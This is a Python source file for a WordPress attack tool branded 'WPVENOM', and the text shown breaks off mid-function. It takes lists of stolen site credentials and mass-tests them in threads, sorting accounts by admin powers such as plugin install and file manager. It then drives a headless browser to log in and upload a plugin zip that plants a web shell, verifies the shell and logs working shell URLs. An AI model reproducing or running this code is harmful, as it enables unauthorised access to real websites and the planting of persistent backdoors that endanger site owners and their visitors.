from multiprocessing.dummy import Pool as ThreadPool
from requests import request
import os,sys,platform,subprocess,requests
from requests.exceptions import RequestException,Timeout,SSLError
import re,socket,time
from colorama import Fore,Style,init,Back
from urllib.parse import urlparse,urlunparse,urljoin
from playwright.sync_api import sync_playwright,TimeoutError
from tabulate import tabulate

results_dir = "results"
checker_dir = os.path.join(results_dir, "checker")
uploader_dir = os.path.join(results_dir, "uploader")
combo_dir = os.path.join(results_dir, "combo")

os.makedirs(checker_dir, exist_ok=True)
os.makedirs(uploader_dir, exist_ok=True)
os.makedirs(combo_dir, exist_ok=True)

_f='Completed'
_e='Shell Check Error'
_d='Unsuccessful'
_c='Successfully'
_b='Upload Denied'
_a='/wp-login.php.*'
_Z='results/uploader/Successfully-logged.txt'
_Y='Login Successful'
_X='upgrade.php'
_W='admin-email-confirm-form'
_V='confirm_admin_email'
_U='profile.php'
_T='Connection Error'
_S='User-Agent'
_R='uninstall'
_Q='utf-8'
_P='playwright'
_O='install'
_N='ttxecy.zip'
_M='Upload Error'
_L='results/uploader/Shells[UPLOADED].txt'
_K='V1.0.0'
_J='pip'
_I='-m'
_H=None
_G='Login Unsuccessfully'
_F=False
_E=True
_D='results/uploader/Unsuccessfully-log.txt'
_C='WordPress'
_B='/'
_A='Not Uploaded'

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
}


def checker_banner():
    print('''\033[35m
                                        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                        ░░      ░░░  ░░░░  ░░        ░░░      ░░░  ░░░░  ░░        ░░       ░░
                                        ▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒  ▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒
                                        ▓  ▓▓▓▓▓▓▓▓        ▓▓      ▓▓▓▓  ▓▓▓▓▓▓▓▓     ▓▓▓▓▓      ▓▓▓▓       ▓▓
                                        █  ████  ██  ████  ██  ████████  ████  ██  ███  ███  ████████  ███  ██
                                        ██      ███  ████  ██        ███      ███  ████  ██        ██  ████  █
                                        ██████████████████████████████████████████████████████████████████████
                                                                       \033[0m
                                                            \033[34m[\033[91m Advanced Wordpress Logs Checker\033[0m \033[34m]\033[0m
                                                                   \033[1;92mAuthor \033[1;91m: \033[1;96m@roothexh\033[0m
''')





def format_banner():
    print('''\033[36m
                                        ░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████████████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░ 
                                        ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
                                        ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
                                        ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ ░▒▓█▓▒░     
                                        ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
                                        ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
                                        ░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
                                                                                     
                                                                \033[34m[ \033[91mWordpress Log Format Changer\033[0m \033[34m]\033[0m
                                                                    \033[1;92mAuthor \033[1;91m: \033[1;96m@roothexh\033[0m
''')


def uploader_banner():
    print('''\033[93m
                                        ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
                                        ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
                                        ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║█████╗  ██████╔╝
                                        ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║██╔══╝  ██╔══██╗
                                        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║
                                         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                    
                                                                \033[34m[ \033[91mWordpress Shell Uploader\033[0m \033[34m]\033[0m
                                                                    \033[1;92mAuthor \033[1;91m: \033[1;96m@roothexh\033[0m
''')


def cracker_banner():
    print('''\033[34m
          

                                             ▄████▄   ▒█████   ███▄ ▄███▓ ▄▄▄▄    ▒█████  
                                            ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▒██▒  ██▒
                                            ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒██░  ██▒
                                            ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒██░█▀  ▒██   ██░
                                            ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░ ████▓▒░
                                            ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░ ▒░▒░▒░ 
                                              ░  ▒     ░ ▒ ▒░ ░  ░      ░▒░▒   ░   ░ ▒ ▒░ 
                                            ░        ░ ░ ░ ▒  ░      ░    ░    ░ ░ ░ ░ ▒  
                                            ░ ░          ░ ░         ░    ░          ░ ░  
                                                ░                                  ░          
                                                                                                             
                                                                \033[34m[ \033[91mWordpress Combo Cracker\033[0m \033[34m]\033[0m
                                                                    \033[1;92mAuthor \033[1;91m: \033[1;96m@roothexh\033[0m
''')



def main_banner():
    print(f'''\033[31m




                                                ┓ ┏┏┓┓┏┏┓┳┓┏┓┳┳┓
                                                ┃┃┃┃┃┃┃┣ ┃┃┃┃┃┃┃
                                                ┗┻┛┣┛┗┛┗┛┛┗┗┛┛ ┗
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠤⠤⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢶⣾⣟⣫⣽⡤⢿⡄⣠⠾⣯⣿⣶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⣯⢿⠿⠋⠉⠉⠁⠀⠀⣷⡟⠀⣥⠤⣿⡇⣈⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⢸⣿⠄⣨⡿⣏⣵⣄⠙⣦⣄⣤⣤⣤⣤⣄⣀⣠⣤⣤⡤⠤
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢿⣿⠟⠀⠀⠀⠀⠀⠀⣠⣾⣿⠃⢠⣿⢻⣷⡟⢡⣿⡿⢿⣄⠘⢿⡟⠽⢿⣎⠉⠻⣿⣶⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⣾⡏⠀⠀⠀⠀⠀⣠⡾⣓⢋⣵⣶⡟⠛⣏⠹⣿⢟⢿⣿⣿⣿⣆⠸⣧⡄⠀⠈⠁⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣿⡏⠿⣴⣆⣤⠖⣿⠿⢓⣼⣿⣿⣿⣿⡧⣸⣿⣛⣇⣜⣩⣿⠛⢿⣀⣿⣿⣠⡀⠀⠀⠀⠀⠀⠀⠀                                                         
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡿⢶⣯⣧⣞⢿⣿⡿⣟⡷⡾⣿⣿⣿⣿⣿⣿⣿⣗⠩⢿⢱⣿⣿⣿⡷⣄⡻⢭⣙⣿⡷⠀⠀⠀⠀⠀⠀⠀                                                         
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢰⠛⡾⠙⣏⢸⡅⢹⣥⣿⣇⣿⣿⣿⣿⣿⡙⠻⣷⣼⡗⠈⠃⡿⣭⣙⡛⠢⠬⠍⠛⠲⠤⠤⠀⠀⠀⠀                                                                 
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣧⣿⣴⣻⣸⣿⣾⣸⣿⣿⣿⢿⣿⢿⢿⣿⣿⡗⠀⢻⣿⢧⣴⣾⣿⠆⡀⠉⠛⠒⠲⠤⠀⠀⠀⠀⠀⠀⠀                                                                         
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢿⢿⠏⠙⠋⠋⠉⠹⣿⣠⡆⠂⠘⣻⣚⣧⣴⣶⣿⣱⠋⢠⣿⠦⠿⠿⠶⢶⣤⣤⣄⣀⡀⠀⠀⠀⠀                                                     
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢀⡀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⢻⣶⣾⣿⣿⣿⣻⠏⠋⠃⠀⢠⣿⡷⢤⣴⣤⣀⠀⠀⠉⠀⠀⠀⠀⠀⠀                                         
    ⠀⠀⠀⠀⠀⠀⢀⣤⠾⠛⠉⠉⠉⠛⠲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣾⣿⣿⣿⣿⣿⣿⣠⠀⠀⠀⢘⣿⡇⠀⠀⠙⠻⢿⣦⣄⠀⠀⠀⠀⠀⠀                                                             
    ⠀⠀⠀⠀⠀⢠⡟⢁⣀⣴⣶⣶⣶⣤⣄⣀⠉⠓⠢⢤⣄⣀⣀⣀⣀⣠⠴⠚⠋⠉⠉⠀⠼⣿⡇⠀⠀⠀⠀⣾⣿⣆⣀⠀⠀⠀⠀⠈⠳⢄⡀⠀⠀⠀⠀                                                 
    ⠀⠀⠀⠀⠀⣼⠀⣿⣿⣿⠿⠿⠿⠿⠿⣿⣵⣦⣄⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣪⣷⣿⣷⡀⢀⣤⣾⣿⡿⠏⠙⠻⠶⠖⠀⠀⠀⠀⠁⠀⠀⠀⠀                                                                             
    ⠀⠀⠀⠀⠀⠸⡶⣿⣿⡇⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣶⣶⣤⣤⣤⣄⣠⣤⣴⣾⣿⣿⣿⡟⠑⣼⢿⣿⡿⠿⠶⠦⣼⣆⠀⠀⠀⠀⠀⣠⣴⡊⠀⠀                                                     
    ⡄⠀⠀⠀⠀⠀⠙⣿⣿⣽⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠯⢿⣿⣿⣿⣿⣿⣏⣿⡇⣸⢋⣼⡟⠀⠀⠀⠀⠀⢻⡄⢀⣀⣴⠾⠛⠉⠀⠀⠀                                     
    ⣷⡄⠀⠀⠀⠀⠀⢸⣾⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣸⣿⣿⣿⡿⣿⣽⣿⣇⡏⣤⣿⠀⠀⠀⠀⠀⠀⢸⣿⡽⠋⠀⠀⠀⠀⠀⠀⠀                                                     
    ⠈⣿⣄⠀⠀⠀⠀⢨⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡻⣿⡿⣷⢈⣿⣿⡿⢸⣿⠃⠀⠀⠀⠀⠀⢠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                     
    ⠀⠘⢯⣓⠦⠤⠶⢋⣾⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⢭⢍⣍⣉⣠⣼⡿⠀⠀⠀⠀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                             
    ⠀⠀⠀⠙⠿⠮⠿⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠾⠿⠟⠛⠛⠛⠋⠁⠀⠀⠀⠀⢠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                     
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                    \033[1;92mAuthor \033[1;91m: \033[1;96m@roothexh\033[0m
''')

def clear_console():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


#Converter
def convert_url_format(input_string):
    try:
        url_temp = input_string.replace("http://", "http//").replace("https://", "https//")
        url_temp = url_temp.replace("wp-login.php:", "wp-login.php#")
        url_temp = url_temp.replace(":", "@")
        url_temp = url_temp.replace("http//", "http://").replace("https//", "https://")
        return url_temp.strip()
    except Exception as e:
        print(f"Error converting input '{input_string}': {e}")
        return None

def convert_format():
    try:
        input_file = input(f'''{Back.BLUE}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/Format-Changer]{Style.RESET_ALL}\n{Back.BLUE}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}Enter WP Logs To Convert Log Format: ''')
        output_file = input(f'''{Back.BLUE}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/Format-Changer]{Style.RESET_ALL}\n{Back.BLUE}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.BLUE}{Fore.WHITE}Enter Output filename: ''')

        with open(input_file, 'r', encoding="utf-8") as file:
            input_list = file.readlines()

        output_list = [convert_url_format(item) for item in input_list if convert_url_format(item)]

        with open(output_file, 'w', encoding="utf-8") as file:
            for item in output_list:
                file.write(item + "\n")

        print(f'''{Back.GREEN}{Fore.WHITE}Converted Successful. Check ''' + output_file )
    except FileNotFoundError:
        print(f'''{Back.RED}{Fore.WHITE}File Not Found. Try Again ... ''')

#CHECKER
def check(url):
    try:
        site, user, passwd = '', '', ''
        if '@' in url and '#' in url:
            site = url.split("#")[0]
            user = url.split("#")[1].split("@")[0]
            passwd = url.split("#")[1].split("@")[1]
        elif url.count('|') == 2:
            data_split = url.split("|")
            site = data_split[0]
            user = data_split[1]
            passwd = data_split[2]
        else:
            raise ValueError(f'''{Style.RESET_ALL}{Back.YELLOW}{Fore.WHITE}Invalid format --> ''' + url)

    except Exception as e:
        print(f'{Style.RESET_ALL}{Back.YELLOW}{Fore.WHITE}[!] Error: {e}')
        return

    try:
        session = request("POST", site, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In'
        }, timeout=5)

        response_text = session.text

        if 'wp-admin/profile.php' in response_text or 'wp-admin/upgrade.php' in response_text:
            print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE} [!] {url} {user} -> Successfully Login.')
            with open(os.path.join(checker_dir, "Successfully_logged_WordPress.txt"), "a") as file:
                file.write(f"{site}#{user}@{passwd}\n")

            if 'plugin-install.php' in response_text:
                print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE} [!] {url} {user} -> Succeeded plugin-install.')
                with open(os.path.join(checker_dir, "plugin-install.txt"), "a") as file:
                    file.write(f"{site}#{user}@{passwd}\n")

            if 'WP File Manager' in response_text:
                print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE} [!] {url} {user} -> Successfully WP File Manager.')
                with open(os.path.join(checker_dir, "filemanager.txt"), "a") as file:
                    file.write(f"{site}#{user}@{passwd}\n")
            
            if 'themes.php' in response_text:
                print(f'{Style.RESET_ALL}{Back.GREEN}{Fore.WHITE} [!] {url} {user} -> Successfully Appearance.')
                with open(os.path.join(checker_dir, "appearance.txt"), "a") as file:
                    file.write(f"{site}#{user}@{passwd}\n")

        else:
            print(f'{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[!] {site} --> [Login Failed]')
    
    except Exception as e:
        print(f'{Style.RESET_ALL}{Back.RED}{Fore.WHITE}[!] {site} --> [Error]')

def wp_check():
    try:
        file_to_check = input(f'''{Back.MAGENTA}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/WP-CHECKER]{Style.RESET_ALL}\n{Back.MAGENTA}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.MAGENTA}{Fore.WHITE}Enter Your File : ''')
        num_threads = int(input(f'''{Back.MAGENTA}{Fore.WHITE}┌──(roothexh㉿roothexh)-[~/WPVENOM/main-menu/WP-CHECKER]{Style.RESET_ALL}\n{Back.MAGENTA}{Fore.WHITE}└─$ {Style.RESET_ALL}{Back.MAGENTA}{Fore.WHITE}Enter Threads : '''))

        with open(file_to_check, 'r', encoding="utf-8", errors="ignore") as file:
            lines = file.read().splitlines()

        pp = ThreadPool(num_threads)
        results = pp.map(check, lines)
        pp.close()
        pp.join()

    except FileNotFoundError:
        print(f'''{Back.RED}{Fore.WHITE}\n\n[!] File not found:''', file_to_check)
        sys.exit(1)



#Uploader
requests.packages.urllib3.disable_warnings()
playwright_imported=_F

WP_ADMIN_PATH='/wp-admin/'
DEFAULT_TIMEOUT=60

def run_command(command):
	A=command
	try:B=subprocess.run(A,shell=_E,check=_E,capture_output=_E,text=_E);print(f"Command executed successfully: {A}");return B.stdout
	except subprocess.CalledProcessError as C:print(f"Error executing command: {A}");print(f"Error output: {C.stderr}");return

def install_and_import(package,version=_H):
	B=version;A=package
	try:
		if B:__import__(A)
		else:__import__(A)
	except ImportError:C=[sys.executable,_I,_J,_O,f"{A}=={B}"if B else A];run_command(' '.join(C))
	except Exception:
		if A==_P:handle_playwright_error()
		else:D=[sys.executable,_I,_J,_R,'-y',A];run_command(' '.join(D));E=[sys.executable,_I,_J,_O,f"{A}=={B}"if B else A];run_command(' '.join(E))


def handle_playwright_error():
	try:import playwright;A=[sys.executable,_I,_J,_R,'-y',_P];run_command(' '.join(A))
	except ImportError:pass
	B=[sys.executable,_I,_J,_O,'playwright==1.43.0'];run_command(' '.join(B))



def display_site_info(site_type,domain,username,password,status,upload_status,upload_path,crawling_status,crawled_domains,error_type=_H):A=error_type;B='_'*60;C=f"❌Error      : {Fore.RED}{A}{Style.RESET_ALL}"if A else'';D=f"""
{Fore.CYAN}{Style.RESET_ALL}{B}
{Style.RESET_ALL}
🌐Domain     : {Fore.BLUE}{domain}{Style.RESET_ALL}  Login : {Fore.GREEN}{status}{Style.RESET_ALL}
📤Path       : {Fore.BLUE}{upload_path}{Style.RESET_ALL}
💀Shells     : {Style.RESET_ALL}{Fore.BLUE}{crawled_domains} domains{Style.RESET_ALL}
{C}
{B}
""";print(D)


def log_to_file(file_name,message):
	with open(file_name,'a',encoding=_Q)as A:A.write(message+'\n')


def content_wtf(req):
	if sys.version_info[0]<3:
		try:return str(req.content)
		except Exception as A:print(A)
	else:
		try:return str(req.content.decode(_Q))
		except:return _F


def EcyAoxen(url,timeout=DEFAULT_TIMEOUT):
	H='https';C=timeout;B=url;B=B.replace('http://','').replace('https://','');A=urlparse(B);D=A.netloc or A.path.split(_B)[0];I=A.path if A.netloc else _B.join(A.path.split(_B)[1:])
	if A.scheme and A.netloc:return B
	J={_S:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
	def E(protocol):
		A=protocol;B=443 if A==H else 80
		try:socket.create_connection((D,B),timeout=C);E=f"{A}://{D}/{I}";F=requests.get(E,headers=J,timeout=C,allow_redirects=_E,verify=_E);return F.url
		except(socket.timeout,socket.error,RequestException,SSLError):return
	F=E(H)
	if F:return F
	G=E('http')
	if G:return G


def check_uploaded_shells(base_url_admin):
	try:
		L=requests.get(f"{base_url_admin}/wp-content/plugins/ttxecy/index.php?UL",timeout=DEFAULT_TIMEOUT);G=L.text
		if'True'in G:
			M=re.sub('</?pre>','',G);N=re.findall('http://\\S+',M);D=0
			for A in N:
				try:
					A=EcyAoxen(A)
					if not A:continue
					O=requests.get(A,timeout=DEFAULT_TIMEOUT)
					if _K in O.text:log_to_file(_L,f"{A}");D+=1
					else:
						try:
							P=['public_html/wp-content','www/wp-content','htdocs/wp-content','html/wp-content','web/wp-content','site/wp-content','public/wp-content','wwwroot/wp-content','httpdocs/wp-content','webroot/wp-content','public_html','www','htdocs','html','web','site','public','wwwroot','httpdocs','webroot'];E=A.find('://')
							if E!=-1:H=A[:E];C=A[E+3:]
							else:H='';C=A
							F=C.find(_B)
							if F!=-1:I=C[:F];B=C[F:]
							else:I=C;B=''
							B=B.lstrip(_B)
							for J in P:
								if B.startswith(J+_B):B=B[len(J):].lstrip(_B);break
							K=f"{H}://{I}/{B}";Q=requests.get(K,timeout=DEFAULT_TIMEOUT)
							if _K in Q.text:log_to_file(_L,f"{K}");D+=1
						except:continue
				except:continue
			return D
	except:return 0


def extract_credentials(panel):
	A=panel
	try:B=A.split('#')[1].split('@')[0];C=re.findall(re.compile(f"#{B}(.*)"),A)[0][1:];return B,C
	except:return _H,_H


def ask_user_preference():
    while True:
        return '2'


def perform_tasks_playwright(panel,base_url,username,password):
	S='input#install-plugin-submit';R='input#pluginzip';Q='Timeout Upload';P='input#wp-submit';O='input#user_pass';N='input#user_login';J='networkidle';G=panel;F=password;E=username;B=base_url
	try:
		A=_H
		with sync_playwright()as T:
			C=T.chromium.launch(headless=_E);D=C.new_page()
			try:D.goto(B,timeout=60000);D.wait_for_load_state(J,timeout=60000)
			except TimeoutError:A='Timeout Log';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			except:A=_T;C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			if not(D.query_selector(N)and D.query_selector(O)and D.query_selector(P)):A='Missing Elements';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			if not fill_field(D,N,E):A='Username Error';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			if not fill_field(D,O,F):A='Password Error';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			if not click_button(D,P,retries=3,delay=5000):A='Submit Error';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			try:D.wait_for_load_state(J,timeout=60000)
			except TimeoutError:A='Timeout load';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			except:A='Error Login';C.close();log_to_file(_D,G);display_site_info(_C,B.split(_B)[2],E,F,_G,_A,_A,_A,0,A);return
			U=D.content()
			if any(A in U for A in[_U,_V,_W,_X]):H=_Y;log_to_file(_Z,G)
			else:H=_G;log_to_file(_D,G);C.close();display_site_info(_C,B.split(_B)[2],E,F,H,_A,_A,_A,0,A);return
			I=re.sub(_a,'',B)
			try:D.goto(f"{I}/wp-admin/plugin-install.php?tab=upload",timeout=60000);D.wait_for_load_state(J,timeout=60000)
			except TimeoutError:A=Q;C.close();display_site_info(_C,B.split(_B)[2],E,F,H,_A,_A,_A,0,A);return
			except:A=_M;C.close();display_site_info(_C,B.split(_B)[2],E,F,H,_A,_A,_A,0,A);return
			if not(D.query_selector(R)and D.query_selector(S)):A=_b;C.close();display_site_info(_C,B.split(_B)[2],E,F,H,_A,_A,_A,0,A);return
			try:D.set_input_files(R,_N);click_button(D,S,retries=3,delay=5000);D.wait_for_load_state(J,timeout=60000);C.close();print(f"{Fore.CYAN}> Upload Verification Please Wait {Fore.YELLOW}[{I}]{Fore.RESET}")
			except TimeoutError:A=Q;C.close();display_site_info(_C,B.split(_B)[2],E,F,H,_A,_A,_A,0,A);return
			except:A=_M;C.close();display_site_info(_C,B.split(_B)[2],E,F,H,_A,_A,_A,0,A);return
			try:
				V=requests.get(f"{I}/wp-content/plugins/ttxecy/index.php")
				if _K in V.text:K=_c;L=f"{I}/wp-content/plugins/ttxecy/index.php";log_to_file(_L,f"{I}/wp-content/plugins/ttxecy/index.php");M=check_uploaded_shells(I)
				else:K=_d;L=_A;M=0;log_to_file(_D,G)
			except:K='Error';L=_A;M=0;A=_e
			display_site_info(_C,B.split(_B)[2],E,F,H,K,L,_f,M,A)
	except:C.close();return


def fill_field(page,selector,value):
	try:page.fill(selector,value,timeout=20000);return _E
	except:return _F


def click_button(page,selector,retries=1,delay=1000):
	for A in range(retries):
		try:page.click(selector,timeout=20000);return _E
		except:time.sleep(delay/1000)
	return _F


def perform_tasks_requests(panel,base_url,username,password):
	b='_wp_http_referer';a='keep-alive';Z='referer';Y='Accept';X='Upgrade-Insecure-Requests';W='Cache-Control';V='Connection';Q='max-age=0';O=panel;F=password;E=username;B=base_url
	try:
		L=urlunparse(urlparse(B)._replace(path='',params='',query='',fragment=''));R={V:a,W:Q,X:'1',_S:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',Y:'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9,fr;q=0.8',Z:f"{L}/wp-admin/"};S={V:a,W:Q,X:'1',Y:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'};T={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.5','cache-control':Q,Z:f"{L}/wp-login.php",'sec-ch-ua':'"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'};A=_H;H=_G;C=_A;G=_A;I=0;J=requests.Session();P={'log':E,'pwd':F,'wp-submit':'Log In','redirect_to':f"{B}{WP_ADMIN_PATH}"}
		try:c=J.post(B,data=P,headers=R,verify=_F,timeout=DEFAULT_TIMEOUT)
		except:A=_T;display_site_info(_C,B.split(_B)[2],E,F,H,C,G,_A,I,A);log_to_file(_D,O);return
		U=content_wtf(c);D=re.search('type="hidden" name="force_redirect_uri-(.*)" id=',U);M=re.search('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"',U)
